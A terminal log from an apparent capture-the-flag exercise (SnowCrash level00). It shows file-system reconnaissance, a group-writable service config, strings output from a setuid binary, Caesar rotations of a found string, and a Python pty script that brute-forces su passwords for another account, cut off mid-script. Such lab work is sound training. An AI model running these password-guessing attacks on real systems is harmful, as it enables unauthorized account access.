/etc/rc5.d/S01console-setup.sh
/etc/rc5.d/S01plymouth
/etc/rc5.d/K01unattended-upgrades
/etc/rc5.d/S01grub-common
/etc/rc5.d/S01uuidd
/etc/rc5.d/S01sysstat
/etc/rc5.d/S01dbus
/etc/rc5.d/S01cron
/etc/rc5.d/S01apport
/etc/binfmt.d
/etc/vconsole.conf
/etc/sudoers.d
/etc/ethertypes
/etc/locale.gen
/etc/sysstat
/etc/sysstat/sysstat.ioconf
/etc/sysstat/sysstat
/etc/ucf.conf
/etc/vtrgb
/etc/X11
/etc/X11/xkb
/etc/X11/Xsession.d
/etc/dhcp
/etc/dhcp/dhclient-exit-hooks.d
/etc/nsswitch.conf
/etc/python3.12
/etc/python3.12/sitecustomize.py
/etc/skel
/etc/skel/.bashrc
/etc/skel/.bash_logout
/etc/skel/.profile
/etc/overlayroot.conf
/etc/cron.d
/etc/cron.d/.placeholder
/etc/cron.d/sysstat
/etc/cron.d/e2scrub_all
/etc/motd
/etc/tmpfiles.d
/etc/tmpfiles.d/screen-cleanup.conf
/etc/xml
/etc/xml/xml-core.xml.old
/etc/xml/xml-core.xml
/etc/xml/polkitd.xml
/etc/xml/polkitd.xml.old
/etc/xml/catalog
/etc/xml/catalog.old
/etc/host.conf
/etc/thermald
/etc/thermald/thermal-cpu-cdev-order.xml
/etc/crypttab
/etc/inputrc
/etc/rsyslog.d
/etc/rsyslog.d/50-default.conf
/etc/rsyslog.d/21-cloudinit.conf
/etc/rsyslog.d/20-ufw.conf
/etc/fuse.conf
/etc/grub.d
/etc/grub.d/00_header
/etc/grub.d/20_linux_xen
/etc/grub.d/05_debian_theme
/etc/grub.d/10_linux_zfs
/etc/grub.d/10_linux
/etc/grub.d/41_custom
/etc/grub.d/README
/etc/grub.d/40_custom
/etc/grub.d/30_os-prober
/etc/grub.d/35_fwupd
/etc/grub.d/25_bli
/etc/grub.d/30_uefi-firmware
/etc/dpkg
/etc/dpkg/origins
/etc/dpkg/shlibs.default
/etc/dpkg/dpkg.cfg
/etc/dpkg/shlibs.override
/etc/dpkg/dpkg.cfg.d
/etc/depmod.d
/etc/depmod.d/ubuntu.conf
/etc/hosts.allow
/etc/ufw
/etc/ufw/sysctl.conf
/etc/ufw/applications.d
/etc/ufw/ufw.conf
/etc/groff
/etc/groff/mdoc.local
/etc/groff/man.local
/etc/legal
/etc/rc0.d
/etc/rc0.d/K01unattended-upgrades
/etc/rc0.d/K01plymouth
/etc/rc0.d/K01uuidd
/etc/rc0.d/K01open-vm-tools
/etc/rc0.d/K01open-iscsi
/etc/rc0.d/K01cryptdisks-early
/etc/rc0.d/K01cryptdisks
/etc/rc0.d/K01iscsid
/etc/fwupd
/etc/fwupd/remotes.d
/etc/fwupd/bios-settings.d
/etc/initramfs-tools
/etc/initramfs-tools/update-initramfs.conf
/etc/initramfs-tools/modules
/etc/initramfs-tools/initramfs.conf
/etc/initramfs-tools/hooks
/etc/initramfs-tools/conf.d
/etc/initramfs-tools/scripts
/etc/libblockdev
/etc/libblockdev/3
/etc/landscape
/etc/bash.bashrc
/etc/apt
/etc/apt/apt.conf.d
/etc/apt/preferences.d
/etc/apt/sources.list.d
/etc/apt/auth.conf.d
/etc/apt/sources.list
/etc/apt/keyrings
/etc/apt/trusted.gpg.d
/etc/apt/preferences.d.save
/etc/libnl-3
/etc/libnl-3/pktloc
/etc/libnl-3/classid
/etc/sgml
/etc/sgml/catalog
/etc/sgml/xml-core.cat
/etc/gnutls
/etc/gnutls/config
/etc/shells
/etc/adduser.conf
/etc/e2scrub.conf
/etc/localtime
/etc/sudo.conf
/etc/update-motd.d
/etc/update-motd.d/92-unattended-upgrades
/etc/update-motd.d/85-fwupd
/etc/update-motd.d/50-landscape-sysinfo
/etc/update-motd.d/91-contract-ua-esm-status
/etc/update-motd.d/00-header
/etc/update-motd.d/97-overlayroot
/etc/ca-certificates.conf
/etc/byobu
/etc/byobu/socketdir
/etc/byobu/backend
/etc/os-release
/etc/update-notifier
/etc/.updated
/etc/rcS.d
/etc/rcS.d/S01keyboard-setup.sh
/etc/rcS.d/K01open-iscsi
/etc/rcS.d/S01screen-cleanup
/etc/rcS.d/S01kmod
/etc/rcS.d/S01ufw
/etc/rcS.d/S01procps
/etc/rcS.d/S01cryptdisks-early
/etc/rcS.d/S01apparmor
/etc/rcS.d/S01plymouth-log
/etc/rcS.d/S01cryptdisks
/etc/rcS.d/K01iscsid
/etc/crontab
/etc/pm
/etc/pm/sleep.d
/etc/apparmor.d
/etc/apparmor.d/abstractions
/etc/apparmor.d/transmission
/etc/apparmor.d/unix-chkpwd
/etc/apparmor.d/sbuild-checkpackages
/etc/apparmor.d/surfshark
/etc/apparmor.d/wike
/etc/apparmor.d/mmdebstrap
/etc/apparmor.d/sbuild-destroychroot
/etc/apparmor.d/tunables
/etc/apparmor.d/podman
/etc/apparmor.d/privacybrowser
/etc/apparmor.d/plasmashell
/etc/apparmor.d/sbuild-abort
/etc/apparmor.d/usr.bin.man
/etc/apparmor.d/sbuild-distupgrade
/etc/apparmor.d/sbuild-hold
/etc/apparmor.d/systemd-coredump
/etc/apparmor.d/lxc-stop
/etc/apparmor.d/local
/etc/apparmor.d/ipa_verify
/etc/apparmor.d/rssguard
/etc/apparmor.d/notepadqq
/etc/apparmor.d/balena-etcher
/etc/apparmor.d/opera
/etc/apparmor.d/cam
/etc/apparmor.d/buildah
/etc/apparmor.d/foliate
/etc/apparmor.d/unprivileged_userns
/etc/apparmor.d/ch-checkns
/etc/apparmor.d/pageedit
/etc/apparmor.d/slack
/etc/apparmor.d/thunderbird
/etc/apparmor.d/kchmviewer
/etc/apparmor.d/busybox
/etc/apparmor.d/sbuild-update
/etc/apparmor.d/obsidian
/etc/apparmor.d/virtiofsd
/etc/apparmor.d/lxc-unshare
/etc/apparmor.d/tup
/etc/apparmor.d/QtWebEngineProcess
/etc/apparmor.d/libcamerify
/etc/apparmor.d/qcam
/etc/apparmor.d/abi
/etc/apparmor.d/loupe
/etc/apparmor.d/signal-desktop
/etc/apparmor.d/1password
/etc/apparmor.d/ch-run
/etc/apparmor.d/devhelp
/etc/apparmor.d/polypane
/etc/apparmor.d/msedge
/etc/apparmor.d/qmapshack
/etc/apparmor.d/sbuild-createchroot
/etc/apparmor.d/vivaldi-bin
/etc/apparmor.d/lxc-create
/etc/apparmor.d/userbindmount
/etc/apparmor.d/sbuild-clean
/etc/apparmor.d/ubuntu_pro_esm_cache
/etc/apparmor.d/tuxedo-control-center
/etc/apparmor.d/steam
/etc/apparmor.d/rpm
/etc/apparmor.d/uwsgi-core
/etc/apparmor.d/scide
/etc/apparmor.d/geary
/etc/apparmor.d/rsyslog.d
/etc/apparmor.d/qutebrowser
/etc/apparmor.d/toybox
/etc/apparmor.d/disable
/etc/apparmor.d/element-desktop
/etc/apparmor.d/usr.lib.snapd.snap-confine.real
/etc/apparmor.d/wpcom
/etc/apparmor.d/usr.bin.tcpdump
/etc/apparmor.d/sbuild-shell
/etc/apparmor.d/crun
/etc/apparmor.d/linux-sandbox
/etc/apparmor.d/flatpak
/etc/apparmor.d/ubuntu_pro_apt_news
/etc/apparmor.d/force-complain
/etc/apparmor.d/vpnns
/etc/apparmor.d/runc
/etc/apparmor.d/slirp4netns
/etc/apparmor.d/lxc-attach
/etc/apparmor.d/lxc-destroy
/etc/apparmor.d/sbuild-upgrade
/etc/apparmor.d/goldendict
/etc/apparmor.d/brave
/etc/apparmor.d/evolution
/etc/apparmor.d/sbuild-adduser
/etc/apparmor.d/trinity
/etc/apparmor.d/rootlesskit
/etc/apparmor.d/keybase
/etc/apparmor.d/sbuild-apt
/etc/apparmor.d/stress-ng
/etc/apparmor.d/nautilus
/etc/apparmor.d/MongoDB_Compass
/etc/apparmor.d/Discord
/etc/apparmor.d/code
/etc/apparmor.d/vdens
/etc/apparmor.d/nvidia_modprobe
/etc/apparmor.d/lxc-execute
/etc/apparmor.d/usr.sbin.rsyslogd
/etc/apparmor.d/lc-compliance
/etc/apparmor.d/sbuild-unhold
/etc/apparmor.d/github-desktop
/etc/apparmor.d/opam
/etc/apparmor.d/epiphany
/etc/apparmor.d/firefox
/etc/apparmor.d/lsb_release
/etc/apparmor.d/sbuild
/etc/apparmor.d/chrome
/etc/apparmor.d/lxc-usernsexec
/etc/cron.daily
/etc/cron.daily/.placeholder
/etc/cron.daily/man-db
/etc/cron.daily/apport
/etc/cron.daily/sysstat
/etc/cron.daily/dpkg
/etc/cron.daily/apt-compat
/etc/cron.daily/logrotate
/etc/ssl
/etc/ssl/openssl.cnf
/etc/ssl/certs
/etc/mdadm
/etc/mdadm/mdadm.conf
/etc/rc2.d
/etc/rc2.d/S01rsync
/etc/rc2.d/S01open-vm-tools
/etc/rc2.d/S01ssh
/etc/rc2.d/S01console-setup.sh
/etc/rc2.d/S01plymouth
/etc/rc2.d/K01unattended-upgrades
/etc/rc2.d/S01grub-common
/etc/rc2.d/S01uuidd
/etc/rc2.d/S01sysstat
/etc/rc2.d/S01dbus
/etc/rc2.d/S01cron
/etc/rc2.d/S01apport
/etc/sysctl.conf
/etc/screenrc
/etc/init.d
/etc/init.d/cron
/etc/init.d/ssh
/etc/init.d/kmod
/etc/init.d/screen-cleanup
/etc/init.d/open-iscsi
/etc/init.d/procps
/etc/init.d/plymouth-log
/etc/init.d/apparmor
/etc/init.d/grub-common
/etc/init.d/uuidd
/etc/init.d/keyboard-setup.sh
/etc/init.d/plymouth
/etc/init.d/apport
/etc/init.d/sysstat
/etc/init.d/dbus
/etc/init.d/ufw
/etc/init.d/open-vm-tools
/etc/init.d/iscsid
/etc/init.d/unattended-upgrades
/etc/init.d/cryptdisks-early
/etc/init.d/rsync
/etc/init.d/console-setup.sh
/etc/init.d/cryptdisks
/etc/python3
/etc/python3/debian_config
/etc/group-
/etc/usb_modeswitch.d
/etc/login.defs
/etc/networkd-dispatcher
/etc/networkd-dispatcher/degraded.d
/etc/networkd-dispatcher/routable.d
/etc/networkd-dispatcher/dormant.d
/etc/networkd-dispatcher/off.d
/etc/networkd-dispatcher/no-carrier.d
/etc/networkd-dispatcher/carrier.d
/etc/ca-certificates
/etc/ca-certificates/update.d
/etc/supercat
/etc/supercat/spcrc-crontab
/etc/supercat/spcrc-crontab-light
/etc/newt
/etc/newt/palette.ubuntu
/etc/newt/palette
/etc/newt/palette.original
/etc/modprobe.d
/etc/modprobe.d/amd64-microcode-blacklist.conf
/etc/modprobe.d/iwlwifi.conf
/etc/modprobe.d/blacklist-rare-network.conf
/etc/modprobe.d/blacklist.conf
/etc/modprobe.d/mdadm.conf
/etc/modprobe.d/blacklist-ath_pci.conf
/etc/modprobe.d/blacklist-framebuffer.conf
/etc/modprobe.d/intel-microcode-blacklist.conf
/etc/modprobe.d/blacklist-firewire.conf
/etc/modprobe.d/disable-algif_aead.conf
/etc/hdparm.conf
/etc/iscsi
/etc/iscsi/iscsid.conf
/etc/cryptsetup-initramfs
/etc/cryptsetup-initramfs/conf-hook
/etc/bash_completion
/etc/cron.weekly
/etc/cron.weekly/.placeholder
/etc/cron.weekly/man-db
/etc/libaudit.conf
/etc/logrotate.d
/etc/logrotate.d/alternatives
/etc/logrotate.d/btmp
/etc/logrotate.d/cloud-init
/etc/logrotate.d/ubuntu-pro-client
/etc/logrotate.d/bootlog
/etc/logrotate.d/apport
/etc/logrotate.d/dpkg
/etc/logrotate.d/ufw
/etc/logrotate.d/apt
/etc/logrotate.d/rsyslog
/etc/logrotate.d/unattended-upgrades
/etc/logrotate.d/wtmp
/etc/xdg
/etc/xdg/systemd
/etc/xdg/user-dirs.defaults
/etc/xdg/user-dirs.conf
/etc/xdg/autostart
/etc/cloud
/etc/cloud/cloud.cfg.d
/etc/cloud/clean.d
/etc/cloud/templates
/etc/cloud/ds-identify.cfg
/etc/cloud/cloud-init.disabled
/etc/cloud/cloud.cfg
/etc/networks
/etc/sensors.d
/etc/sensors.d/.placeholder
/etc/protocols
/etc/subuid
/etc/default
/etc/default/cron
/etc/default/ssh
/etc/default/useradd
/etc/default/motd-news
/etc/default/open-iscsi
/etc/default/grub.ucf-dist
/etc/default/intel-microcode
/etc/default/apport
/etc/default/sysstat
/etc/default/dbus
/etc/default/grub.d
/etc/default/ufw
/etc/default/mdadm
/etc/default/grub
/etc/default/networkd-dispatcher
/etc/default/keyboard
/etc/default/rsync
/etc/default/amd64-microcode
/etc/default/locale
/etc/default/pollinate
/etc/default/cryptdisks
/etc/default/console-setup
/etc/passwd-
/etc/machine-id
/etc/bindresvport.blacklist
/etc/services
/etc/zsh_command_not_found
/etc/pki
/etc/pki/fwupd
/etc/pki/fwupd-metadata
/etc/network
/etc/network/if-up.d
/etc/network/if-pre-up.d
/etc/manpath.config
/etc/pollinate
/etc/pollinate/add-user-agent
/etc/iproute2
/etc/iproute2/group
/etc/iproute2/rt_dsfield
/etc/iproute2/rt_realms
/etc/iproute2/rt_scopes
/etc/iproute2/rt_tables.d
/etc/iproute2/nl_protos
/etc/iproute2/ematch_map
/etc/iproute2/rt_tables
/etc/iproute2/rt_protos.d
/etc/iproute2/rt_protos
/etc/iproute2/bpf_pinning
/etc/console-setup
/etc/console-setup/cached_Uni2-Fixed16.psf.gz
/etc/console-setup/compose.ISO-8859-5.inc
/etc/console-setup/Uni2-Fixed16.psf.gz
/etc/console-setup/cached_ISO-8859-1.acm.gz
/etc/console-setup/compose.CP1255.inc
/etc/console-setup/vtrgb.vga
/etc/console-setup/cached_ISO-8859-1_del.kmap.gz
/etc/console-setup/compose.ARMSCII-8.inc
/etc/console-setup/compose.ISO-8859-15.inc
/etc/console-setup/compose.ISO-8859-10.inc
/etc/console-setup/compose.VISCII.inc
/etc/console-setup/ISO-8859-1.acm
/etc/console-setup/compose.GEORGIAN-ACADEMY.inc
/etc/console-setup/compose.ISO-8859-8.inc
/etc/console-setup/compose.ISO-8859-6.inc
/etc/console-setup/compose.IBM1133.inc
/etc/console-setup/vtrgb
/etc/console-setup/compose.KOI8-R.inc
/etc/console-setup/compose.ISO-8859-3.inc
/etc/console-setup/cached_UTF-8_del.kmap.gz
/etc/console-setup/compose.ISO-8859-1.inc
/etc/console-setup/compose.ISO-8859-16.inc
/etc/console-setup/compose.CP1256.inc
/etc/console-setup/compose.ISO-8859-9.inc
/etc/console-setup/cached_setup_terminal.sh
/etc/console-setup/compose.TIS-620.inc
/etc/console-setup/compose.GEORGIAN-PS.inc
/etc/console-setup/compose.KOI8-U.inc
/etc/console-setup/compose.ISO-8859-2.inc
/etc/console-setup/compose.ISIRI-3342.inc
/etc/console-setup/compose.ISO-8859-13.inc
/etc/console-setup/compose.ISO-8859-4.inc
/etc/console-setup/compose.ISO-8859-11.inc
/etc/console-setup/compose.CP1251.inc
/etc/console-setup/remap.inc
/etc/console-setup/compose.ISO-8859-14.inc
/etc/console-setup/cached_setup_font.sh
/etc/console-setup/compose.ISO-8859-7.inc
/etc/console-setup/cached_setup_keyboard.sh
/etc/rmt
/etc/dhcpcd.conf
/etc/deluser.conf
/etc/dbus-1
/etc/dbus-1/system.d
/etc/dbus-1/session.d
/etc/rsyslog.conf
/etc/opt
/etc/juanita
/etc/juanita/config.yaml
/etc/cron.monthly
/etc/cron.monthly/.placeholder
/etc/logrotate.conf
/etc/lvm
/etc/lvm/profile
/etc/lvm/lvmlocal.conf
/etc/lvm/lvm.conf
/srv
/opt
/opt/snowcrash
/opt/snowcrash/bonus03
/opt/snowcrash/level06
/opt/snowcrash/level02
/opt/snowcrash/bonus02
/opt/snowcrash/level04
/opt/snowcrash/level07
/opt/snowcrash/level09
/opt/snowcrash/level10
/opt/snowcrash/level00
/opt/snowcrash/level05
/opt/snowcrash/level01
/opt/snowcrash/bonus05
/opt/snowcrash/level03
/opt/snowcrash/level08
/opt/snowcrash/bonus01
/opt/snowcrash/bonus04
/lib.usr-is-merged
/media
level00@snowcrash:~$ cat /etc/juanita/config.yaml
# /etc/juanita/config.yaml
# Juanita Marquez Memorial Configuration Service v3.1.0
# Generated by ops-config-mgr on 2042-01-01

# ---------------------------------------------------------------------------
# metadata
# ---------------------------------------------------------------------------
metadata:
  service_name: juanita
  description: >
    Configuration executor for the Juanita Marquez Memorial Service.
  maintainer: ops@snowcrash.local
  version: "3.1.0"
  created: "2042-01-01"
  last_modified: "2042-06-01"

# ---------------------------------------------------------------------------
# global defaults
# ---------------------------------------------------------------------------
defaults: &global_defaults
  environment: production
  region: burbclave-07
  log_retention_days: 30
  enable_telemetry: false
  max_restarts: 5
  restart_delay_secs: 10

# ---------------------------------------------------------------------------
# network
# ---------------------------------------------------------------------------
network:
  <<: *global_defaults
  listen_address: "127.0.0.1"
  listen_port: 9042
  tls_enabled: false
  connect_timeout_secs: 5
  read_timeout_secs: 15
  retry_on_codes:
    - 503
    - 504
    - 429

# ---------------------------------------------------------------------------
# storage
# ---------------------------------------------------------------------------
storage:
  <<: *global_defaults
  data_dir: /var/lib/juanita
  tmp_dir: /tmp/juanita
  max_file_size_mb: 128
  compression: zstd
  checksum_algorithm: sha256

# ---------------------------------------------------------------------------
# logging
# ---------------------------------------------------------------------------
logging_config:
  level: info
  format: json
  destinations:
    - type: file
      path: /var/log/juanita/juanita.log
      rotate: daily
      keep_days: 7
    - type: syslog
      facility: daemon
      tag: juanita
  structured_fields:
    - service
    - version
    - region

# ---------------------------------------------------------------------------
# executor defaults
# ---------------------------------------------------------------------------
executor_defaults: &executor_defaults
  timeout_secs: 30
  retry_count: 3
  log_level: info
  working_directory: /var/run/juanita
  environment_vars:
    JUANITA_ENV: production
    JUANITA_REGION: burbclave-07

# ---------------------------------------------------------------------------
# services
# ---------------------------------------------------------------------------
services:
  health_check:
    enabled: true
    interval_secs: 60
    endpoint: /health
    expected_status: 200

  metrics:
    enabled: false
    push_gateway: http://127.0.0.1:9091
    push_interval_secs: 30
    job_name: juanita

  executor:
    <<: *executor_defaults
    command: "/bin/true"
    run_as_shell: true
    capture_output: true
    fail_on_nonzero: false

# ---------------------------------------------------------------------------
# alerting
# ---------------------------------------------------------------------------
alerting:
  <<: *global_defaults
  enabled: false
  channels:
    - name: ops-slack
      type: webhook
      url: https://hooks.example.invalid/juanita
      on_failure: true
      on_recovery: true
  throttle_secs: 300

# ---------------------------------------------------------------------------
# zone_policy
# Site-specific deployment parameters. Group bonus04 may update this section.
# Changes take effect on the next service invocation.
# ---------------------------------------------------------------------------
zone_policy: &zone_policy
  last_updated_by: "ops"
  last_updated_at: "2042-06-01T00:00:00Z"
level00@snowcrash:~$ ls -la /etc/juanita
total 12
drwxr-xr-x   2 root juanita_grp 4096 Jun  9 19:04 .
drwxr-xr-x 112 root root        4096 Sep 26 00:24 ..
-rw-rw-r--   1 root juanita_grp 3722 Jun  9 19:04 config.yaml
level00@snowcrash:~$ ls -la /var/lib/juanita /tmp/juanita /var/log/juanita /var/run/juanita 2>/dev/null
level00@snowcrash:~$ netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null
Please ask your administrator.
Netid                    State                     Recv-Q                    Send-Q                                          Local Address:Port                                       Peer Address:Port                    Process                    
udp                      UNCONN                    0                         0                                                  127.0.0.54:53                                              0.0.0.0:*                                                  
udp                      UNCONN                    0                         0                                               127.0.0.53%lo:53                                              0.0.0.0:*                                                  
udp                      UNCONN                    0                         0                                            10.0.2.15%enp0s3:68                                              0.0.0.0:*                                                  
tcp                      LISTEN                    0                         4096                                            127.0.0.53%lo:53                                              0.0.0.0:*                                                  
tcp                      LISTEN                    0                         4096                                               127.0.0.54:53                                              0.0.0.0:*                                                  
tcp                      LISTEN                    0                         4096                                                  0.0.0.0:4242                                            0.0.0.0:*                                                  
tcp                      LISTEN                    0                         4096                                                     [::]:4242                                               [::]:*                                                  
level00@snowcrash:~$ cat /opt/snowcrash/level00/.flag_data
cat: /opt/snowcrash/level00/.flag_data: No such file or directory
level00@snowcrash:~$ ls -la /opt/snowcrash/level00/
total 36
drwxr-xr-x  2 root   root     4096 Jun  9 19:03 .
drwxr-xr-x 18 root   root     4096 Jun  9 19:04 ..
-r-sr-x---  1 flag00 level00 27112 Jun  9 19:03 hiro
level00@snowcrash:~$ strings /opt/snowcrash/level00/hiro
/lib64/ld-linux-x86-64.so.2
eNa%
mfUa
fgets
snprintf
stdin
strncpy
__stack_chk_fail
exit
fflush
difftime
fopen
getpwuid
getgrnam
usleep
getpid
stdout
strftime
atoi
strcspn
__libc_start_main
stderr
ctermid
fprintf
__cxa_finalize
localtime
getgid
fclose
memset
fputc
fputs
__isoc99_sscanf
getuid
getegid
fwrite
strcmp
strncmp
geteuid
libc.so.6
GLIBC_2.7
GLIBC_2.4
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
APQWVASAQA
%Y-%m-%dT%H:%M:%S
%s seq=%u uid=%d euid=%d gid=%d user=%s term=%s retries=%d event=%s
flag00
/var/log/snowcrash/hiro.log
%63[^=]=%127s
version
max_retries
session_timeout
rate_limit
audit_enabled
log_path
/dev/pts/
/dev/tty
METRICS sessions=%llu denials=%llu timeouts=%llu commands=%llu avg_secs=%.2f
flag00@snowcrash:~$ 
[*] Checking credentials...
[*] Access granted 
 welcome, flag00
Session timeout.
uid=3000(flag00) gid=3000(flag00) groups=3000(flag00)
whoami
flag00
hostname
SnowCrash
uname -a
uname
Linux SnowCrash 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
/home/flag00
SHELL=/bin/bash
HOME=/home/flag00
USER=flag00
LOGNAME=flag00
PATH=/usr/local/bin:/usr/bin:/bin
TERM=xterm-256color
total 12
drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .
drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..
-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag
-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hiro
cat: permission denied
sudo
sudo: sorry, you must have a tty to run sudo
su: Authentication failure
exit
quit
logout
help
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
Type 'help' to see this list.
%s: command not found
/etc/snowcrash/hiro.conf
error: policy version mismatch
denied_uid_range
error: uid not permitted
denied_username_invalid
error: invalid username
denied_rate_limit
error: rate limit exceeded
denied_group
error: group membership check failed
session_start
session_end
>@f2av5il02puano7naaf6adaf3a
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
hiro.c
flag_data
g_shutdown_flag
g_audit_seq
g_audit_fd
g_retry_count
g_session_pid
g_policy_level
g_rate_table
g_cred_cache
handle_sigterm
open_audit
write_audit_record
audit_event
close_audit
load_default_policy
parse_policy_file
uid_hash
cache_credentials
lookup_cached_creds
rate_check
check_policy_version
check_session_timeout
check_terminal
verify_group_membership
g_metrics
metrics_record_session
metrics_record_denial
metrics_record_command
metrics_emit
init_context
fatal
run_restricted_shell
validate_uid_range
validate_username_chars
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
localtime@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
stdin@GLIBC_2.2.5
getpid@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
getpwuid@GLIBC_2.2.5
_fini
__stack_chk_fail@GLIBC_2.4
getuid@GLIBC_2.2.5
difftime@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
fputc@GLIBC_2.2.5
strcspn@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
getgrnam@GLIBC_2.2.5
_IO_stdin_used
getgid@GLIBC_2.2.5
fflush@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
_end
getegid@GLIBC_2.2.5
__bss_start
main
strftime@GLIBC_2.2.5
ctermid@GLIBC_2.2.5
fopen@GLIBC_2.2.5
atoi@GLIBC_2.2.5
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
usleep@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.flag_data
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
level00@snowcrash:~$ /opt/snowcrash/level00/hiro
[*] Checking credentials...
[*] Access granted — welcome, flag00
flag00@snowcrash:~$ getflag
getflag: command not found
flag00@snowcrash:~$ echo "$(</home/flag00/.flag)"
echo "$(</home/flag00/.flag)": command not found
flag00@snowcrash:~$ read FLAG < /home/flag00/.flag && echo $FLAG
read FLAG < /home/flag00/.flag && echo $FLAG: command not found
flag00@snowcrash:~$ echo "$(</.flag)"
echo "$(</.flag)": command not found
flag00@snowcrash:~$ help
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
Type 'help' to see this list.
flag00@snowcrash:~$ echo "$(</home/flag00/.flag)"
echo "$(</home/flag00/.flag)": command not found
flag00@snowcrash:~$ python3 -c '
s = "f2av5il02puano7naaf6adaf3a"
for i in range(26):
    res = "".join(chr((ord(c)-97+i)%26+97) if "a"<=c<="z" else c for c in s)
    print(f"ROT-{i:02d}: {res}")
'python3 -c ': command not found
flag00@snowcrash:~$ s = "f2av5il02puano7naaf6adaf3a": command not found
flag00@snowcrash:~$ for i in range(26):: command not found
flag00@snowcrash:~$     res = "".join(chr((ord(c)-97+i)%26+97) if "a"<=c<="z" else c for c in s): command not found
flag00@snowcrash:~$     print(f"ROT-{i:02d}: {res}"): command not found
flag00@snowcrash:~$ exit
'exit: command not found
flag00@snowcrash:~$ ^C
level00@snowcrash:~$ python3 -c '
s = "f2av5il02puano7naaf6adaf3a"
for i in range(26):
    res = "".join(chr((ord(c)-97+i)%26+97) if "a"<=c<="z" else c for c in s)
    print(f"ROT-{i:02d}: {res}")
'
ROT-00: f2av5il02puano7naaf6adaf3a
ROT-01: g2bw5jm02qvbop7obbg6bebg3b
ROT-02: h2cx5kn02rwcpq7pcch6cfch3c
ROT-03: i2dy5lo02sxdqr7qddi6dgdi3d
ROT-04: j2ez5mp02tyers7reej6ehej3e
ROT-05: k2fa5nq02uzfst7sffk6fifk3f
ROT-06: l2gb5or02vagtu7tggl6gjgl3g
ROT-07: m2hc5ps02wbhuv7uhhm6hkhm3h
ROT-08: n2id5qt02xcivw7viin6ilin3i
ROT-09: o2je5ru02ydjwx7wjjo6jmjo3j
ROT-10: p2kf5sv02zekxy7xkkp6knkp3k
ROT-11: q2lg5tw02aflyz7yllq6lolq3l
ROT-12: r2mh5ux02bgmza7zmmr6mpmr3m
ROT-13: s2ni5vy02chnab7anns6nqns3n
ROT-14: t2oj5wz02diobc7boot6orot3o
ROT-15: u2pk5xa02ejpcd7cppu6pspu3p
ROT-16: v2ql5yb02fkqde7dqqv6qtqv3q
ROT-17: w2rm5zc02glref7errw6rurw3r
ROT-18: x2sn5ad02hmsfg7fssx6svsx3s
ROT-19: y2to5be02intgh7gtty6twty3t
ROT-20: z2up5cf02jouhi7huuz6uxuz3u
ROT-21: a2vq5dg02kpvij7ivva6vyva3v
ROT-22: b2wr5eh02lqwjk7jwwb6wzwb3w
ROT-23: c2xs5fi02mrxkl7kxxc6xaxc3x
ROT-24: d2yt5gj02nsylm7lyyd6ybyd3y
ROT-25: e2zu5hk02otzmn7mzze6zcze3z
level00@snowcrash:~$ python3 -c '
import pty, os, time

s = "f2av5il02puano7naaf6adaf3a"

for i in range(26):
    pwd = "".join(chr((ord(c)-97+i)%26+97) if "a"<=c<="z" else c for c in s)
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00", "-c", "whoami")
    else:
        time.sleep(0.05)
        os.write(fd, (pwd + "\n").encode())
        output = b""
        while True:
            try:
                data = os.read(fd, 1024)
                if not data: break
                output += data
            except OSError:
                break
        os.waitpid(pid, 0)
        if b"flag00" in output and b"Authentication failure" not in output:
            print(f"\n[+] ¡CONTRASEÑA ENCONTRADA! ROT-{i:02d}: {pwd}")
            break
'
^Z
[2]+  Stopped                 python3 -c '
import pty, os, time

s = "f2av5il02puano7naaf6adaf3a"

for i in range(26):
    pwd = "".join(chr((ord(c)-97+i)%26+97) if "a"<=c<="z" else c for c in s)
    pid, fd = pty.fork()
    if pid == 0:
        os.execlp("su", "su", "flag00", "-c", "whoami")
    else:
        time.sleep(0.05)
        os.write(fd, (pwd + "\n").encode())
        output = b""
        while True:
            try:
                data = os.read(fd, 1024)
                if not data: break
                output += data
            except OSError:
                break
        os.waitpid(pid, 0)
        if b"flag00" in output and b"Authentication failure" not in output:
            print(f"\n[+] ¡CONTRASEÑA ENCONTRADA! ROT-{i:02d}: {pwd}")
            break
'
level00@snowcrash:~$ echo "f2av5il02puano7naaf6adaf3a" | tr 'a-zA-Z' 'l-za-jk-L-ZA-JK-'
tr: range-endpoints of 'k-L' are in reverse collating sequence order
level00@snowcrash:~$ python3 -c '
import pty, os, time, select

base_str = "f2av5il02puano7naaf6adaf3a"

# Generar las 26 rotaciones Caesar de la cadena
passwords = []
for shift in range(26):
    pwd = ""
    for c in base_str:
        if "a" <= c <= "z":
